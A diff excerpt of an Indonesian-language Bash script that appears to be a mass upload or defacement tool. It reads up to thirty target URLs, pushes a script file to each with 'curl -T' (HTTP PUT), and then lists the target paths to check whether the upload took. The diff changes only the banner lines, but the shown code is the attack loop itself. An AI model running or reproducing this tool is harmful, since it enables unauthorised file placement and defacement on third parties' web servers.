@@ -1750,7 +1750,7 @@ echo -e $a ''
 read -p ' Target keduapuluh-sembilan : ' ke29
 echo -e $b ''
 read -p ' Target ketigapuluh : ' ke30
-echo -e $g '========[Proses]========'
+echo -e $a "========$b[$a P$b|r$c|o$e|s$f|e$g|s $b]$a========"
 echo -e $c ''
 curl -T $alamat/$sc $ke1
 curl -T $alamat/$sc $ke2
@@ -1791,7 +1791,7 @@ echo -e $e ''
 curl -T $alamat/$sc $ke28
 curl -T $alamat/$sc $ke29
 curl -T $alamat/$sc $ke30
-echo '========[Selesai]========' | lolcat
+echo -e $a "========$b[$a S$b|e$c|l$e|e$f|s$g|a$a|i $b]$a========"
 echo -e $f ''
 echo "Cek : $ke1/$sc"
 echo "Cek : $ke2/$sc"
@@ -1829,5 +1829,5 @@ echo "Cek : $ke28/$sc"
 echo "Cek : $ke29/$sc"
 echo "Cek : $ke30/$sc"
 echo -e $b 'Jika Tidak bisa diAkses Berarti Gagal'
-echo -e $c 'Bay-Bay' | lolcat
+echo -e $c 'Bay-Bay'
 fi
